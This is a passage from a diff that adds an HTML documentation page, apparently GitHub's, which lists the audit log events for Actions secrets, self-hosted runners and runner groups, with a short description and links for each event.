+            secret is updated.
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>repo.create_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
+            secret is created for a repository. For more information, see “<a
+              href="/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository"
+              >Creating encrypted secrets for a repository</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>repo.remove_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
+            secret is removed.
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>repo.update_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
+            secret is updated.
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <h3 id="events-for-self-hosted-runners">Events for self-hosted runners</h3>
+    <table>
+      <colgroup>
+        <col style="width: 48%" />
+        <col style="width: 51%" />
+      </colgroup>
+      <thead>
+        <tr class="header">
+          <th>Action</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="odd">
+          <td><code>enterprise.register_self_hosted_runner</code></td>
+          <td>
+            Triggered when a new self-hosted runner is registered. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise"
+              >Adding a self-hosted runner to an enterprise</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>enterprise.remove_self_hosted_runner</code></td>
+          <td>Triggered when a self-hosted runner is removed.</td>
+        </tr>
+        <tr class="odd">
+          <td><code>enterprise.runner_group_runners_updated</code></td>
+          <td>
+            Triggered when a runner group’s list of members is updated. For more
+            information, see “<a
+              href="/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization"
+              >Set self-hosted runners in a group for an organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>enterprise.self_hosted_runner_updated</code></td>
+          <td>
+            Triggered when the runner application is updated. Can be viewed
+            using the REST API and the UI. This event is not included when you
+            export the audit log as JSON data or a CSV file. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners"
+              >About self-hosted runners</a
+            >” and “<a
+              href="/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log"
+              >Reviewing the audit log for your organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.register_self_hosted_runner</code></td>
+          <td>
+            Triggered when a new self-hosted runner is registered. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization"
+              >Adding a self-hosted runner to an organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.remove_self_hosted_runner</code></td>
+          <td>
+            Triggered when a self-hosted runner is removed. For more
+            information, see
+            <a
+              href="/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization"
+              >Removing a runner from an organization</a
+            >.
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.runner_group_runners_updated</code></td>
+          <td>
+            Triggered when a runner group’s list of members is updated. For more
+            information, see “<a
+              href="/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization"
+              >Set self-hosted runners in a group for an organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.self_hosted_runner_updated</code></td>
+          <td>
+            Triggered when the runner application is updated. Can be viewed
+            using the REST API and the UI; not visible in the JSON/CSV export.
+            For more information, see “<a
+              href="/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners"
+              >About self-hosted runners</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>repo.register_self_hosted_runner</code></td>
+          <td>
+            Triggered when a new self-hosted runner is registered. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository"
+              >Adding a self-hosted runner to a repository</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>repo.remove_self_hosted_runner</code></td>
+          <td>
+            Triggered when a self-hosted runner is removed. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository"
+              >Removing a runner from a repository</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>repo.self_hosted_runner_updated</code></td>
+          <td>
+            Triggered when the runner application is updated. Can be viewed
+            using the REST API and the UI; not visible in the JSON/CSV export.
+            For more information, see “<a
+              href="/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners"
+              >About self-hosted runners</a
+            >.”
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <h3 id="events-for-self-hosted-runner-groups">
+      Events for self-hosted runner groups
+    </h3>
+    <table>
+      <colgroup>
+        <col style="width: 48%" />
+        <col style="width: 51%" />
+      </colgroup>
+      <thead>
+        <tr class="header">
+          <th>Action</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="odd">
+          <td><code>enterprise.runner_group_created</code></td>
+          <td>
+            Triggered when a self-hosted runner group is created. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise"
+              >Creating a self-hosted runner group for an enterprise</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>enterprise.runner_group_removed</code></td>
+          <td>
+            Triggered when a self-hosted runner group is removed. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group"
+              >Removing a self-hosted runner group</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>enterprise.runner_group_runner_removed</code></td>
+          <td>
+            Triggered when the REST API is used to remove a self-hosted runner
+            from a group.
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>enterprise.runner_group_runners_added</code></td>
+          <td>
+            Triggered when a self-hosted runner is added to a group. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group"
+              >Moving a self-hosted runner to a group</a
+            >.”{% ifversion fpt or ghes &gt; 2.22 or ghae %}
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>enterprise.runner_group_updated</code></td>
+          <td>
+            Triggered when the configuration of a self-hosted runner group is
+            changed. For more information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group"
+              >Changing the access policy of a self-hosted runner group</a
+            >.”{% endif %}{% ifversion ghes = 2.22 %}
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>enterprise.runner_group_renamed</code></td>
+          <td>Triggered when the self-hosted runner group is renamed.</td>
+        </tr>
+        <tr class="odd">
+          <td><code>enterprise.runner_group_visiblity_updated</code></td>
+          <td>
+            Triggered when the visibility settings of the self-hosted runner
+            group are changed.{% endif %}
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.runner_group_created</code></td>
+          <td>
+            Triggered when a self-hosted runner group is created. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization"
+              >Creating a self-hosted runner group for an organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.runner_group_removed</code></td>
+          <td>
+            Triggered when a self-hosted runner group is removed. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group"
+              >Removing a self-hosted runner group</a
+            >.”{% ifversion fpt or ghes &gt; 2.22 or ghae %}
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.runner_group_updated</code></td>
+          <td>
+            Triggered when the configuration of a self-hosted runner group is
+            changed. For more information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group"
+              >Changing the access policy of a self-hosted runner group</a
+            >.”{% endif %}
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.runner_group_runners_added</code></td>
+          <td>
+            Triggered when a self-hosted runner is added to a group. For more
+            information, see “<a
+              href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group"
+              >Moving a self-hosted runner to a group</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.runner_group_runner_removed</code></td>
+          <td>
+            Triggered when the REST API is used to remove a self-hosted runner
+            from a group. For more information, see “<a
+              href="/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization"
+              >Remove a self-hosted runner from a group for an organization</a
+            >.”{% ifversion ghes = 2.22 %}
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.runner_group_renamed</code></td>
+          <td>Triggered when the self-hosted runner group is renamed.</td>
+        </tr>
+        <tr class="even">
+          <td><code>org.runner_group_visiblity_updated</code></td>
+          <td>
+            Triggered when the visibility settings of the self-hosted runner
+            group are changed.{% endif %}
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <h3 id="events-for-workflow-activities">Events for workflow activities</h3>
+    <p>{% data reusables.actions.actions-audit-events-workflow %}</p>
+  </body>
+</html>
